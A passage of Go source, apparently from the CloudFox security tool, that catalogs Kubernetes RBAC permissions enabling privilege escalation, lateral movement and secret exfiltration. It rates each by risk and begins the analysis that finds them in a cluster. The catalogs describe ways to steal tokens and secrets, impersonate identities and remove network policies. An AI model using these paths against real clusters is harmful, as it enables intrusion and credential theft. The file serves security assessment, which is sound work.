package attackpathservice

import (
	"context"
	"fmt"
	"strings"

	"github.com/BishopFox/cloudfox/internal"
	"github.com/BishopFox/cloudfox/kubernetes/sdk"
	"github.com/BishopFox/cloudfox/kubernetes/shared"
	v1 "k8s.io/api/rbac/v1"
	"k8s.io/client-go/kubernetes"
)

// AttackPathService provides analysis for privilege escalation, lateral movement, and data exfiltration paths in K8s
type AttackPathService struct {
	clientset  *kubernetes.Clientset
	logger     *internal.Logger
	moduleName string
	crdGroups  map[string]bool // API groups from CRDs in the cluster (populated at analysis time)
}

// New creates a new AttackPathService using the shared clientset
func New() (*AttackPathService, error) {
	clientset, err := sdk.GetClientset()
	if err != nil {
		return nil, fmt.Errorf("failed to get clientset: %w", err)
	}
	logger := internal.NewLogger()
	return &AttackPathService{
		clientset:  clientset,
		logger:     &logger,
		moduleName: "attackpath", // generic name for service
	}, nil
}

// NewWithClientset creates an AttackPathService with a specific clientset
func NewWithClientset(clientset *kubernetes.Clientset) *AttackPathService {
	logger := internal.NewLogger()
	return &AttackPathService{
		clientset:  clientset,
		logger:     &logger,
		moduleName: "attackpath",
	}
}

// SetModuleName updates the module name for logging purposes
func (s *AttackPathService) SetModuleName(moduleName string) {
	s.moduleName = moduleName
}

// PrivescPermission represents a permission that enables privilege escalation
type PrivescPermission struct {
	Verb        string `json:"verb"`
	Resource    string `json:"resource"`
	APIGroup    string `json:"apiGroup"`
	Category    string `json:"category"`
	RiskLevel   string `json:"riskLevel"`
	Description string `json:"description"`
}

// LateralMovementPermission represents a permission that enables lateral movement
type LateralMovementPermission struct {
	Verb        string `json:"verb"`
	Resource    string `json:"resource"`
	APIGroup    string `json:"apiGroup"`
	Category    string `json:"category"`
	RiskLevel   string `json:"riskLevel"`
	Description string `json:"description"`
}

// DataExfilPermission represents a permission that enables data exfiltration
type DataExfilPermission struct {
	Verb        string `json:"verb"`
	Resource    string `json:"resource"`
	APIGroup    string `json:"apiGroup"`
	Category    string `json:"category"`
	RiskLevel   string `json:"riskLevel"`
	Description string `json:"description"`
}

// HiddenAdminPermission represents a permission that indicates hidden administrative access (IAM/RBAC escalation)
type HiddenAdminPermission struct {
	Verb        string `json:"verb"`
	Resource    string `json:"resource"`
	APIGroup    string `json:"apiGroup"`
	Category    string `json:"category"`
	RiskLevel   string `json:"riskLevel"`
	Description string `json:"description"`
}

// HiddenAdminFinding represents a hidden admin finding with full context
type HiddenAdminFinding struct {
	Principal      string   `json:"principal"`
	PrincipalType  string   `json:"principalType"` // User, Group, ServiceAccount
	Namespace      string   `json:"namespace"`
	Scope          string   `json:"scope"` // cluster, namespace
	RoleName       string   `json:"roleName"`
	BindingName    string   `json:"bindingName"`
	RiskLevel      string   `json:"riskLevel"`
	Permissions    []string `json:"permissions"`
	Description    string   `json:"description"`
	CloudIAM       string   `json:"cloudIAM"`       // AWS/GCP/Azure IAM role if annotated
	ActivePods     int      `json:"activePods"`     // Number of pods using this SA
	IsDefault      bool     `json:"isDefault"`      // Is this the default SA
	IsWildcard     bool     `json:"isWildcard"`     // Is this a wildcard group binding
	IsAggregation  bool     `json:"isAggregation"`  // Is this from an aggregation role
	AttackSteps    []string `json:"attackSteps"`    // Steps in the attack path
	Feasibility    string   `json:"feasibility"`    // Immediate, Requires-Enum, Complex
	ExploitCommand string   `json:"exploitCommand"`
}

// HiddenAdminData holds all hidden admin findings
type HiddenAdminData struct {
	ClusterAdmins       []HiddenAdminFinding `json:"clusterAdmins"`       // cluster-admin or system:masters
	RBACModifiers       []HiddenAdminFinding `json:"rbacModifiers"`       // Can modify RBAC
	Impersonators       []HiddenAdminFinding `json:"impersonators"`       // Can impersonate
	CertApprovers       []HiddenAdminFinding `json:"certApprovers"`       // Can approve CSRs
	AggregationRoles    []HiddenAdminFinding `json:"aggregationRoles"`    // Aggregation roles
	WildcardBindings    []HiddenAdminFinding `json:"wildcardBindings"`    // Wildcard group bindings
	DefaultSAElevations []HiddenAdminFinding `json:"defaultSAElevations"` // Default SA with elevated perms
	AllFindings         []HiddenAdminFinding `json:"allFindings"`
}

// AttackPath represents an attack path (exfil, lateral, or privesc)
type AttackPath struct {
	Principal      string   `json:"principal"`
	PrincipalType  string   `json:"principalType"` // User, Group, ServiceAccount
	Method         string   `json:"method"`
	TargetResource string   `json:"targetResource"`
	Permissions    []string `json:"permissions"`
	Category       string   `json:"category"`
	RiskLevel      string   `json:"riskLevel"`
	Description    string   `json:"description"`
	ExploitCommand string   `json:"exploitCommand"`
	Namespace      string   `json:"namespace"`
	ScopeType      string   `json:"scopeType"` // cluster, namespace
	ScopeID        string   `json:"scopeId"`   // namespace name or "cluster"
	ScopeName      string   `json:"scopeName"`
	PathType       string   `json:"pathType"`   // "exfil", "lateral", or "privesc"
	SourceType     string   `json:"sourceType"` // "core" (built-in K8s) or "crd" (custom resource)
	RoleName       string   `json:"roleName"`   // The role/clusterrole granting this
	BindingName    string   `json:"bindingName"`
}

// CombinedAttackPathData holds all attack paths across cluster/namespace levels
type CombinedAttackPathData struct {
	ClusterPaths   []AttackPath            `json:"clusterPaths"`
	NamespacePaths map[string][]AttackPath `json:"namespacePaths"` // namespace -> paths
	AllPaths       []AttackPath            `json:"allPaths"`
	Namespaces     []string                `json:"namespaces"`
}

// GetPrivescPermissions returns permissions that enable privilege escalation
func GetPrivescPermissions() []PrivescPermission {
	return []PrivescPermission{
		// Cluster Admin - CRITICAL
		{Verb: "*", Resource: "*", APIGroup: "*", Category: "Cluster Admin", RiskLevel: shared.RiskCritical, Description: "Full cluster administrative access (cluster-admin equivalent)"},

		// RBAC Escalation - CRITICAL
		{Verb: "create", Resource: "clusterrolebindings", APIGroup: "rbac.authorization.k8s.io", Category: "RBAC Escalation", RiskLevel: shared.RiskCritical, Description: "Create cluster-wide role bindings to escalate privileges"},
		{Verb: "create", Resource: "rolebindings", APIGroup: "rbac.authorization.k8s.io", Category: "RBAC Escalation", RiskLevel: shared.RiskHigh, Description: "Create namespace role bindings to escalate privileges"},
		{Verb: "bind", Resource: "clusterroles", APIGroup: "rbac.authorization.k8s.io", Category: "RBAC Escalation", RiskLevel: shared.RiskCritical, Description: "Bind any cluster role without having its permissions"},
		{Verb: "bind", Resource: "roles", APIGroup: "rbac.authorization.k8s.io", Category: "RBAC Escalation", RiskLevel: shared.RiskHigh, Description: "Bind any role without having its permissions"},
		{Verb: "escalate", Resource: "clusterroles", APIGroup: "rbac.authorization.k8s.io", Category: "RBAC Escalation", RiskLevel: shared.RiskCritical, Description: "Create/update roles with permissions not held"},
		{Verb: "escalate", Resource: "roles", APIGroup: "rbac.authorization.k8s.io", Category: "RBAC Escalation", RiskLevel: shared.RiskCritical, Description: "Create/update roles with permissions not held"},
		{Verb: "update", Resource: "clusterroles", APIGroup: "rbac.authorization.k8s.io", Category: "RBAC Escalation", RiskLevel: shared.RiskHigh, Description: "Modify cluster roles to add permissions"},
		{Verb: "patch", Resource: "clusterroles", APIGroup: "rbac.authorization.k8s.io", Category: "RBAC Escalation", RiskLevel: shared.RiskHigh, Description: "Patch cluster roles to add permissions"},

		// Impersonation - CRITICAL
		{Verb: "impersonate", Resource: "users", APIGroup: "", Category: "Impersonation", RiskLevel: shared.RiskCritical, Description: "Impersonate any user including cluster-admin"},
		{Verb: "impersonate", Resource: "groups", APIGroup: "", Category: "Impersonation", RiskLevel: shared.RiskCritical, Description: "Impersonate any group including system:masters"},
		{Verb: "impersonate", Resource: "serviceaccounts", APIGroup: "", Category: "Impersonation", RiskLevel: shared.RiskHigh, Description: "Impersonate any service account"},
		{Verb: "impersonate", Resource: "userextras/*", APIGroup: "", Category: "Impersonation", RiskLevel: shared.RiskHigh, Description: "Impersonate with extra user info"},

		// Pod Creation (Container Escape) - CRITICAL
		{Verb: "create", Resource: "pods", APIGroup: "", Category: "Pod Creation", RiskLevel: shared.RiskCritical, Description: "Create privileged pods for container escape or node access"},
		{Verb: "create", Resource: "pods/exec", APIGroup: "", Category: "Pod Exec", RiskLevel: shared.RiskHigh, Description: "Execute commands in existing containers"},
		{Verb: "create", Resource: "pods/attach", APIGroup: "", Category: "Pod Exec", RiskLevel: shared.RiskHigh, Description: "Attach to running containers"},

		// Workload Creation with SA - HIGH
		{Verb: "create", Resource: "deployments", APIGroup: "apps", Category: "Workload Creation", RiskLevel: shared.RiskHigh, Description: "Create deployments with privileged service accounts"},
		{Verb: "create", Resource: "daemonsets", APIGroup: "apps", Category: "Workload Creation", RiskLevel: shared.RiskHigh, Description: "Create daemonsets running on all nodes"},
		{Verb: "create", Resource: "statefulsets", APIGroup: "apps", Category: "Workload Creation", RiskLevel: shared.RiskHigh, Description: "Create statefulsets with privileged access"},
		{Verb: "create", Resource: "replicasets", APIGroup: "apps", Category: "Workload Creation", RiskLevel: shared.RiskHigh, Description: "Create replicasets with privileged access"},
		{Verb: "create", Resource: "jobs", APIGroup: "batch", Category: "Workload Creation", RiskLevel: shared.RiskHigh, Description: "Create jobs with privileged service accounts"},
		{Verb: "create", Resource: "cronjobs", APIGroup: "batch", Category: "Workload Creation", RiskLevel: shared.RiskHigh, Description: "Create cronjobs for persistent access"},

		// Workload Modification - HIGH
		{Verb: "patch", Resource: "pods", APIGroup: "", Category: "Pod Modification", RiskLevel: shared.RiskHigh, Description: "Modify pods to inject containers or change security context"},
		{Verb: "update", Resource: "pods", APIGroup: "", Category: "Pod Modification", RiskLevel: shared.RiskHigh, Description: "Update pods to inject containers or change security context"},
		{Verb: "patch", Resource: "deployments", APIGroup: "apps", Category: "Workload Modification", RiskLevel: shared.RiskHigh, Description: "Modify deployments to inject backdoors"},
		{Verb: "update", Resource: "deployments", APIGroup: "apps", Category: "Workload Modification", RiskLevel: shared.RiskHigh, Description: "Update deployments to inject backdoors"},
		{Verb: "patch", Resource: "daemonsets", APIGroup: "apps", Category: "Workload Modification", RiskLevel: shared.RiskHigh, Description: "Modify daemonsets for node-wide persistence"},
		{Verb: "update", Resource: "daemonsets", APIGroup: "apps", Category: "Workload Modification", RiskLevel: shared.RiskHigh, Description: "Update daemonsets for node-wide persistence"},

		// Service Account Token - HIGH
		{Verb: "create", Resource: "serviceaccounts/token", APIGroup: "", Category: "Token Creation", RiskLevel: shared.RiskHigh, Description: "Generate tokens for any service account"},
		{Verb: "create", Resource: "tokenrequests", APIGroup: "", Category: "Token Creation", RiskLevel: shared.RiskHigh, Description: "Request tokens for service accounts"},

		// Node Access - CRITICAL
		{Verb: "create", Resource: "nodes", APIGroup: "", Category: "Node Access", RiskLevel: shared.RiskCritical, Description: "Register rogue nodes to steal secrets"},
		{Verb: "update", Resource: "nodes", APIGroup: "", Category: "Node Access", RiskLevel: shared.RiskHigh, Description: "Modify node configurations"},
		{Verb: "proxy", Resource: "nodes", APIGroup: "", Category: "Node Access", RiskLevel: shared.RiskHigh, Description: "Proxy requests to kubelet API"},
		{Verb: "get", Resource: "nodes/proxy", APIGroup: "", Category: "Node Access", RiskLevel: shared.RiskCritical, Description: "Access kubelet API via nodes/proxy to execute commands on all pods (RCE) - ref: grahamhelton.com/blog/nodes-proxy-rce"},

		// Webhook Admission Controllers - CRITICAL
		{Verb: "create", Resource: "validatingwebhookconfigurations", APIGroup: "admissionregistration.k8s.io", Category: "Webhook", RiskLevel: shared.RiskCritical, Description: "Create validating webhooks to intercept/block requests"},
		{Verb: "create", Resource: "mutatingwebhookconfigurations", APIGroup: "admissionregistration.k8s.io", Category: "Webhook", RiskLevel: shared.RiskCritical, Description: "Create mutating webhooks to inject malicious content"},
		{Verb: "update", Resource: "validatingwebhookconfigurations", APIGroup: "admissionregistration.k8s.io", Category: "Webhook", RiskLevel: shared.RiskCritical, Description: "Modify validating webhooks"},
		{Verb: "update", Resource: "mutatingwebhookconfigurations", APIGroup: "admissionregistration.k8s.io", Category: "Webhook", RiskLevel: shared.RiskCritical, Description: "Modify mutating webhooks"},

		// CSR Approval - HIGH
		{Verb: "approve", Resource: "certificatesigningrequests/approval", APIGroup: "certificates.k8s.io", Category: "Certificate", RiskLevel: shared.RiskHigh, Description: "Approve CSRs to generate valid certificates"},
		{Verb: "update", Resource: "certificatesigningrequests/approval", APIGroup: "certificates.k8s.io", Category: "Certificate", RiskLevel: shared.RiskHigh, Description: "Approve CSRs to generate valid certificates"},

		// PersistentVolume - HIGH
		{Verb: "create", Resource: "persistentvolumes", APIGroup: "", Category: "Storage", RiskLevel: shared.RiskHigh, Description: "Create hostPath PVs for node filesystem access"},

		// CRD Management - HIGH (can create CRDs without validation, then inject data via controllers)
		{Verb: "create", Resource: "customresourcedefinitions", APIGroup: "apiextensions.k8s.io", Category: "CRD Management", RiskLevel: shared.RiskHigh, Description: "Create CRDs without validation to inject data into controllers"},
		{Verb: "update", Resource: "customresourcedefinitions", APIGroup: "apiextensions.k8s.io", Category: "CRD Management", RiskLevel: shared.RiskHigh, Description: "Modify CRD validation schemas to weaken security controls"},
		{Verb: "patch", Resource: "customresourcedefinitions", APIGroup: "apiextensions.k8s.io", Category: "CRD Management", RiskLevel: shared.RiskHigh, Description: "Patch CRD definitions to remove validation or add conversion webhooks"},
		{Verb: "delete", Resource: "customresourcedefinitions", APIGroup: "apiextensions.k8s.io", Category: "CRD Management", RiskLevel: shared.RiskHigh, Description: "Delete CRDs to disrupt controllers and remove security policies"},
	}
}

// GetLateralMovementPermissions returns permissions that enable lateral movement
func GetLateralMovementPermissions() []LateralMovementPermission {
	return []LateralMovementPermission{
		// Pod Exec - HIGH (lateral to other pods)
		{Verb: "create", Resource: "pods/exec", APIGroup: "", Category: "Pod Access", RiskLevel: shared.RiskHigh, Description: "Execute commands in pods across namespaces"},
		{Verb: "create", Resource: "pods/attach", APIGroup: "", Category: "Pod Access", RiskLevel: shared.RiskHigh, Description: "Attach to pods across namespaces"},
		{Verb: "create", Resource: "pods/portforward", APIGroup: "", Category: "Pod Access", RiskLevel: shared.RiskMedium, Description: "Port forward to access internal services"},

		// Service Account Token Theft - HIGH
		{Verb: "get", Resource: "secrets", APIGroup: "", Category: "Token Theft", RiskLevel: shared.RiskHigh, Description: "Read SA tokens from secrets for impersonation"},
		{Verb: "list", Resource: "secrets", APIGroup: "", Category: "Token Theft", RiskLevel: shared.RiskHigh, Description: "List and read SA tokens from secrets"},
		{Verb: "create", Resource: "serviceaccounts/token", APIGroup: "", Category: "Token Theft", RiskLevel: shared.RiskHigh, Description: "Generate tokens for lateral movement"},

		// ConfigMap Access (often contains service URLs) - MEDIUM
		{Verb: "get", Resource: "configmaps", APIGroup: "", Category: "Config Access", RiskLevel: shared.RiskMedium, Description: "Read configuration for service discovery"},
		{Verb: "list", Resource: "configmaps", APIGroup: "", Category: "Config Access", RiskLevel: shared.RiskMedium, Description: "List configurations for service discovery"},

		// Service/Endpoint Discovery - MEDIUM
		{Verb: "get", Resource: "services", APIGroup: "", Category: "Service Discovery", RiskLevel: shared.RiskMedium, Description: "Discover services for lateral movement"},
		{Verb: "list", Resource: "services", APIGroup: "", Category: "Service Discovery", RiskLevel: shared.RiskMedium, Description: "List services for lateral movement"},
		{Verb: "get", Resource: "endpoints", APIGroup: "", Category: "Service Discovery", RiskLevel: shared.RiskMedium, Description: "Discover pod IPs for direct access"},
		{Verb: "list", Resource: "endpoints", APIGroup: "", Category: "Service Discovery", RiskLevel: shared.RiskMedium, Description: "List pod IPs for direct access"},

		// Node Access - HIGH
		{Verb: "proxy", Resource: "nodes", APIGroup: "", Category: "Node Access", RiskLevel: shared.RiskHigh, Description: "Proxy to kubelet for node-level access"},
		{Verb: "get", Resource: "nodes/proxy", APIGroup: "", Category: "Node Access", RiskLevel: shared.RiskHigh, Description: "Access kubelet API for pod listing"},

		// Network Policy Bypass - HIGH
		{Verb: "delete", Resource: "networkpolicies", APIGroup: "networking.k8s.io", Category: "Network", RiskLevel: shared.RiskHigh, Description: "Delete network policies to enable lateral movement"},
		{Verb: "update", Resource: "networkpolicies", APIGroup: "networking.k8s.io", Category: "Network", RiskLevel: shared.RiskHigh, Description: "Modify network policies to allow traffic"},
		{Verb: "patch", Resource: "networkpolicies", APIGroup: "networking.k8s.io", Category: "Network", RiskLevel: shared.RiskHigh, Description: "Patch network policies to allow traffic"},

		// Namespace Access - MEDIUM
		{Verb: "get", Resource: "namespaces", APIGroup: "", Category: "Namespace Discovery", RiskLevel: shared.RiskMedium, Description: "Discover namespaces for lateral movement targets"},
		{Verb: "list", Resource: "namespaces", APIGroup: "", Category: "Namespace Discovery", RiskLevel: shared.RiskMedium, Description: "List namespaces for lateral movement targets"},

		// Pod Discovery - MEDIUM
		{Verb: "get", Resource: "pods", APIGroup: "", Category: "Pod Discovery", RiskLevel: shared.RiskMedium, Description: "Find pods for lateral movement"},
		{Verb: "list", Resource: "pods", APIGroup: "", Category: "Pod Discovery", RiskLevel: shared.RiskMedium, Description: "List pods for lateral movement"},

		// Ingress/Gateway - MEDIUM
		{Verb: "update", Resource: "ingresses", APIGroup: "networking.k8s.io", Category: "Ingress", RiskLevel: shared.RiskMedium, Description: "Modify ingress to redirect traffic"},
		{Verb: "patch", Resource: "ingresses", APIGroup: "networking.k8s.io", Category: "Ingress", RiskLevel: shared.RiskMedium, Description: "Patch ingress to redirect traffic"},

		// CRD-based Lateral Movement - modify security policy CRDs to open paths
		{Verb: "delete", Resource: "*", APIGroup: "networking.istio.io", Category: "CRD Policy Bypass", RiskLevel: shared.RiskHigh, Description: "Delete Istio network policies to enable lateral movement"},
		{Verb: "update", Resource: "*", APIGroup: "networking.istio.io", Category: "CRD Policy Bypass", RiskLevel: shared.RiskHigh, Description: "Modify Istio network policies to allow traffic"},
		{Verb: "delete", Resource: "*", APIGroup: "cilium.io", Category: "CRD Policy Bypass", RiskLevel: shared.RiskHigh, Description: "Delete Cilium network policies to enable lateral movement"},
		{Verb: "update", Resource: "*", APIGroup: "cilium.io", Category: "CRD Policy Bypass", RiskLevel: shared.RiskHigh, Description: "Modify Cilium network policies to allow traffic"},
		{Verb: "delete", Resource: "*", APIGroup: "projectcalico.org", Category: "CRD Policy Bypass", RiskLevel: shared.RiskHigh, Description: "Delete Calico network policies to enable lateral movement"},
		{Verb: "update", Resource: "*", APIGroup: "projectcalico.org", Category: "CRD Policy Bypass", RiskLevel: shared.RiskHigh, Description: "Modify Calico network policies to allow traffic"},
	}
}

// GetDataExfilPermissions returns permissions that enable data exfiltration
func GetDataExfilPermissions() []DataExfilPermission {
	return []DataExfilPermission{
		// Secrets - CRITICAL
		{Verb: "get", Resource: "secrets", APIGroup: "", Category: "Secrets", RiskLevel: shared.RiskCritical, Description: "Read secrets containing credentials, API keys, certificates"},
		{Verb: "list", Resource: "secrets", APIGroup: "", Category: "Secrets", RiskLevel: shared.RiskCritical, Description: "List and read all secrets"},
		{Verb: "*", Resource: "secrets", APIGroup: "", Category: "Secrets", RiskLevel: shared.RiskCritical, Description: "Full access to secrets"},

		// ConfigMaps - HIGH (may contain sensitive configs)
		{Verb: "get", Resource: "configmaps", APIGroup: "", Category: "ConfigMaps", RiskLevel: shared.RiskHigh, Description: "Read configmaps that may contain sensitive data"},
		{Verb: "list", Resource: "configmaps", APIGroup: "", Category: "ConfigMaps", RiskLevel: shared.RiskHigh, Description: "List and read all configmaps"},

		// Pod Logs - HIGH
		{Verb: "get", Resource: "pods/log", APIGroup: "", Category: "Logs", RiskLevel: shared.RiskHigh, Description: "Read pod logs that may contain sensitive data"},

		// Pod Exec (for data extraction) - HIGH
		{Verb: "create", Resource: "pods/exec", APIGroup: "", Category: "Data Extraction", RiskLevel: shared.RiskHigh, Description: "Exec into pods to extract data"},

		// PersistentVolume Claims - HIGH
		{Verb: "get", Resource: "persistentvolumeclaims", APIGroup: "", Category: "Storage", RiskLevel: shared.RiskHigh, Description: "Access persistent volume claims for data access"},
		{Verb: "create", Resource: "persistentvolumeclaims", APIGroup: "", Category: "Storage", RiskLevel: shared.RiskHigh, Description: "Create PVCs to access existing PVs"},

		// Custom Resources (may contain sensitive data) - MEDIUM
		{Verb: "get", Resource: "*", APIGroup: "*", Category: "Custom Resources", RiskLevel: shared.RiskMedium, Description: "Read custom resources that may contain sensitive data"},
		{Verb: "list", Resource: "*", APIGroup: "*", Category: "Custom Resources", RiskLevel: shared.RiskMedium, Description: "List custom resources that may contain sensitive data"},

		// CRD-specific sensitive data - cert-manager, external-secrets, vault
		{Verb: "get", Resource: "*", APIGroup: "cert-manager.io", Category: "CRD Secrets (Certs)", RiskLevel: shared.RiskHigh, Description: "Read cert-manager certificates and private keys"},
		{Verb: "list", Resource: "*", APIGroup: "cert-manager.io", Category: "CRD Secrets (Certs)", RiskLevel: shared.RiskHigh, Description: "List cert-manager certificates"},
		{Verb: "get", Resource: "*", APIGroup: "external-secrets.io", Category: "CRD Secrets (ExtSecrets)", RiskLevel: shared.RiskHigh, Description: "Read external-secrets that reference cloud secret stores"},
		{Verb: "list", Resource: "*", APIGroup: "external-secrets.io", Category: "CRD Secrets (ExtSecrets)", RiskLevel: shared.RiskHigh, Description: "List external-secrets configurations"},
		{Verb: "get", Resource: "*", APIGroup: "secrets-store.csi.x-k8s.io", Category: "CRD Secrets (CSI)", RiskLevel: shared.RiskHigh, Description: "Read secrets-store CSI driver configurations"},
		{Verb: "get", Resource: "*", APIGroup: "vault.hashicorp.com", Category: "CRD Secrets (Vault)", RiskLevel: shared.RiskHigh, Description: "Read Vault secrets and auth configurations"},
		{Verb: "list", Resource: "*", APIGroup: "vault.hashicorp.com", Category: "CRD Secrets (Vault)", RiskLevel: shared.RiskHigh, Description: "List Vault secrets and auth configurations"},

		// Service Account Tokens - HIGH
		{Verb: "create", Resource: "serviceaccounts/token", APIGroup: "", Category: "Token Exfil", RiskLevel: shared.RiskHigh, Description: "Generate SA tokens for external use"},

		// Etcd (if accessible) - CRITICAL
		{Verb: "get", Resource: "pods/exec", APIGroup: "", Category: "Etcd Access", RiskLevel: shared.RiskCritical, Description: "Exec access to etcd pods for database dump"},
	}
}

// GetHiddenAdminPermissions returns permissions that indicate hidden administrative access (IAM/RBAC escalation)
// These are specifically focused on RBAC manipulation and identity escalation, not general privesc
func GetHiddenAdminPermissions() []HiddenAdminPermission {
	return []HiddenAdminPermission{
		// RBAC Modification - Can escalate privileges by modifying roles/bindings
		{Verb: "create", Resource: "clusterroles", APIGroup: "rbac.authorization.k8s.io", Category: "RBAC Modification", RiskLevel: shared.RiskCritical, Description: "Can create ClusterRoles with arbitrary permissions"},
		{Verb: "update", Resource: "clusterroles", APIGroup: "rbac.authorization.k8s.io", Category: "RBAC Modification", RiskLevel: shared.RiskCritical, Description: "Can modify ClusterRoles to add permissions"},
		{Verb: "patch", Resource: "clusterroles", APIGroup: "rbac.authorization.k8s.io", Category: "RBAC Modification", RiskLevel: shared.RiskCritical, Description: "Can patch ClusterRoles to add permissions"},
		{Verb: "delete", Resource: "clusterroles", APIGroup: "rbac.authorization.k8s.io", Category: "RBAC Modification", RiskLevel: shared.RiskHigh, Description: "Can delete ClusterRoles to weaken security"},

		{Verb: "create", Resource: "clusterrolebindings", APIGroup: "rbac.authorization.k8s.io", Category: "RBAC Modification", RiskLevel: shared.RiskCritical, Description: "Can bind any identity to cluster-admin"},
		{Verb: "update", Resource: "clusterrolebindings", APIGroup: "rbac.authorization.k8s.io", Category: "RBAC Modification", RiskLevel: shared.RiskCritical, Description: "Can modify ClusterRoleBindings to escalate privileges"},
		{Verb: "patch", Resource: "clusterrolebindings", APIGroup: "rbac.authorization.k8s.io", Category: "RBAC Modification", RiskLevel: shared.RiskCritical, Description: "Can patch ClusterRoleBindings to escalate privileges"},
		{Verb: "delete", Resource: "clusterrolebindings", APIGroup: "rbac.authorization.k8s.io", Category: "RBAC Modification", RiskLevel: shared.RiskHigh, Description: "Can delete ClusterRoleBindings to remove access controls"},

		{Verb: "create", Resource: "roles", APIGroup: "rbac.authorization.k8s.io", Category: "RBAC Modification", RiskLevel: shared.RiskHigh, Description: "Can create Roles with arbitrary namespace permissions"},
		{Verb: "update", Resource: "roles", APIGroup: "rbac.authorization.k8s.io", Category: "RBAC Modification", RiskLevel: shared.RiskHigh, Description: "Can modify Roles to add permissions"},
		{Verb: "patch", Resource: "roles", APIGroup: "rbac.authorization.k8s.io", Category: "RBAC Modification", RiskLevel: shared.RiskHigh, Description: "Can patch Roles to add permissions"},

		{Verb: "create", Resource: "rolebindings", APIGroup: "rbac.authorization.k8s.io", Category: "RBAC Modification", RiskLevel: shared.RiskHigh, Description: "Can bind any identity to admin in namespace"},
		{Verb: "update", Resource: "rolebindings", APIGroup: "rbac.authorization.k8s.io", Category: "RBAC Modification", RiskLevel: shared.RiskHigh, Description: "Can modify RoleBindings to escalate privileges"},
		{Verb: "patch", Resource: "rolebindings", APIGroup: "rbac.authorization.k8s.io", Category: "RBAC Modification", RiskLevel: shared.RiskHigh, Description: "Can patch RoleBindings to escalate privileges"},

		// RBAC Special Verbs - Bypass escalation prevention
		{Verb: "bind", Resource: "clusterroles", APIGroup: "rbac.authorization.k8s.io", Category: "RBAC Escalation", RiskLevel: shared.RiskCritical, Description: "Can bind any ClusterRole without having its permissions"},
		{Verb: "bind", Resource: "roles", APIGroup: "rbac.authorization.k8s.io", Category: "RBAC Escalation", RiskLevel: shared.RiskHigh, Description: "Can bind any Role without having its permissions"},
		{Verb: "escalate", Resource: "clusterroles", APIGroup: "rbac.authorization.k8s.io", Category: "RBAC Escalation", RiskLevel: shared.RiskCritical, Description: "Can create/update ClusterRoles with permissions not held"},
		{Verb: "escalate", Resource: "roles", APIGroup: "rbac.authorization.k8s.io", Category: "RBAC Escalation", RiskLevel: shared.RiskCritical, Description: "Can create/update Roles with permissions not held"},

		// Impersonation - Can act as other identities
		{Verb: "impersonate", Resource: "users", APIGroup: "", Category: "Impersonation", RiskLevel: shared.RiskCritical, Description: "Can impersonate any user including system:admin"},
		{Verb: "impersonate", Resource: "groups", APIGroup: "", Category: "Impersonation", RiskLevel: shared.RiskCritical, Description: "Can impersonate any group including system:masters"},
		{Verb: "impersonate", Resource: "serviceaccounts", APIGroup: "", Category: "Impersonation", RiskLevel: shared.RiskHigh, Description: "Can impersonate any ServiceAccount"},
		{Verb: "impersonate", Resource: "userextras/*", APIGroup: "", Category: "Impersonation", RiskLevel: shared.RiskHigh, Description: "Can impersonate with extra user info"},

		// Certificate Signing - Can create new cluster identities
		{Verb: "create", Resource: "certificatesigningrequests", APIGroup: "certificates.k8s.io", Category: "Certificate Approval", RiskLevel: shared.RiskHigh, Description: "Can submit CSRs for new identities"},
		{Verb: "update", Resource: "certificatesigningrequests/approval", APIGroup: "certificates.k8s.io", Category: "Certificate Approval", RiskLevel: shared.RiskCritical, Description: "Can approve CSRs to generate valid certificates"},
		{Verb: "approve", Resource: "certificatesigningrequests/approval", APIGroup: "certificates.k8s.io", Category: "Certificate Approval", RiskLevel: shared.RiskCritical, Description: "Can approve CSRs for system:masters"},

		// Wildcard access on RBAC - Catch-all for full RBAC control
		{Verb: "*", Resource: "*", APIGroup: "rbac.authorization.k8s.io", Category: "Full RBAC Control", RiskLevel: shared.RiskCritical, Description: "Full control over all RBAC resources"},
		{Verb: "*", Resource: "clusterroles", APIGroup: "rbac.authorization.k8s.io", Category: "Full RBAC Control", RiskLevel: shared.RiskCritical, Description: "Full control over ClusterRoles"},
		{Verb: "*", Resource: "clusterrolebindings", APIGroup: "rbac.authorization.k8s.io", Category: "Full RBAC Control", RiskLevel: shared.RiskCritical, Description: "Full control over ClusterRoleBindings"},
		{Verb: "*", Resource: "roles", APIGroup: "rbac.authorization.k8s.io", Category: "Full RBAC Control", RiskLevel: shared.RiskHigh, Description: "Full control over Roles"},
		{Verb: "*", Resource: "rolebindings", APIGroup: "rbac.authorization.k8s.io", Category: "Full RBAC Control", RiskLevel: shared.RiskHigh, Description: "Full control over RoleBindings"},
	}
}

// getCacheKeyForPathType returns the cache key for a given path type
func getCacheKeyForPathType(pathType string) string {
	switch pathType {
	case "privesc":
		return sdk.CacheKeyAttackPathsPrivesc
	case "lateral":
		return sdk.CacheKeyAttackPathsLateral
	case "exfil":
		return sdk.CacheKeyAttackPathsExfil
	case "all":
		return sdk.CacheKeyAttackPathsAll
	default:
		return sdk.CacheKey("k8s-attackpaths", pathType)
	}
}

// CombinedAnalysis performs attack path analysis across cluster and namespace scopes.
// Results are cached for the duration of the session to avoid redundant computation.
func (s *AttackPathService) CombinedAnalysis(ctx context.Context, pathType string) (*CombinedAttackPathData, error) {
	cacheKey := getCacheKeyForPathType(pathType)

	// Check cache first
	if cached, found := sdk.Get(cacheKey); found {
		if result, ok := cached.(*CombinedAttackPathData); ok {
			return result, nil
		}
	}

	result := &CombinedAttackPathData{
		ClusterPaths:   []AttackPath{},
		NamespacePaths: make(map[string][]AttackPath),
		AllPaths:       []AttackPath{},
		Namespaces:     []string{},
	}

	// Load CRD groups for dynamic matching
	crdGroups, err := sdk.GetCRDGroups(ctx)
	if err != nil {
		// Non-fatal: CRD detection won't work but static analysis continues
		s.crdGroups = make(map[string]bool)
	} else {
		s.crdGroups = crdGroups
	}

	// Get target namespaces (respects namespace filtering flags)
	namespaces := shared.GetTargetNamespaces(ctx, s.clientset, s.logger, s.moduleName)
	result.Namespaces = namespaces

	// Analyze cluster-level RBAC
	clusterPaths, err := s.AnalyzeClusterAttackPaths(ctx, pathType)
	if err != nil {
		// Log but continue with namespace analysis - this is expected if user lacks permissions
		_ = err
	}
	result.ClusterPaths = clusterPaths
	result.AllPaths = append(result.AllPaths, clusterPaths...)

	// Analyze namespace-level RBAC
	for _, ns := range namespaces {
		nsPaths, err := s.AnalyzeNamespaceAttackPaths(ctx, ns, pathType)
		if err != nil {
			// Skip namespaces we can't access - expected if user lacks permissions
			continue
		}
		if len(nsPaths) > 0 {
			result.NamespacePaths[ns] = nsPaths
			result.AllPaths = append(result.AllPaths, nsPaths...)
